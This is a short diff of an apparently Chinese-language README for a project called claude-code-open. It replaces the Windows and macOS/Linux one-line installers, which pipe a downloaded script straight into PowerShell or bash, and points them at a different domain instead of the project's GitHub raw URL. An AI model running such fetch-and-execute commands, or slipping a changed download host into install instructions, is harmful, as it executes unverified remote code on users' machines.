@@ -521,10 +521,10 @@ function getClaudeClient(model) {
 
 ```bash
 # Windows
-irm https://raw.githubusercontent.com/kill136/claude-code-open/main/install.ps1 | iex
+irm https://www.chatbi.site/assets/scripts/install.ps1 | iex
 
 # macOS/Linux
-curl -fsSL https://raw.githubusercontent.com/kill136/claude-code-open/main/install.sh | bash
+curl -fsSL https://www.chatbi.site/assets/scripts/install.sh | bash
 ```
 
 2. **启动守护进程**
